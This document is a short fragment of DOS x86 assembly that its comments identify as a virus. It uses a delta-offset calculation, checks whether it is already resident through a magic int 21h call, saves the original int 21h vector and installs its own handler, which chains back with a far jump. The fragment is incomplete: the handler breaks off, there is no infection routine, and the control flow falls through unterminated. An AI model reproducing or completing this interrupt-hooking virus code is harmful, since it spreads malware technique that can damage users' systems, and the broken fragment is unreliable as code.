org 0h


call $+3  ; To calculate delta offset
start:
     pop bp           ; BP = Delta+3
     sub bp, 3        ; To get to the True start of the virus
     mov word [data_section.save_bp+bp], bp
     mov word [new_int21.bp_shi+bp], bp

     mov ax, 9a8ah    ; Are we in memory yet?
     int 21h          ; Call to int 21h
     cmp ax, 8b7b     ; Is AX 8b7b?
     je dont_install
install:
     mov ax, 3521h    ; Get vector 21h
     int 21h          ; call int 21h
     mov word [goto_int21+bp+1], bx  ; Save Int 21h offset
     mov word [goto_int21+bp+3], es  ; And segment
     mov ax, 2521h         ; Set vector 21h
     mov dx, new_int21+bp  ; DS:DX = new_int21
     int 21h
      




new_int21:
     pusha
     call near .past_bp
.bp_shi dw 0
.past_bp: 
     pop bp
     sub bp, 2
     mov word ax, [bp]
     mov bp, ax



goto_int21: db 0EAh, 00h, 00h, 00h, 00h

data_section:
     .save_bp dw 0
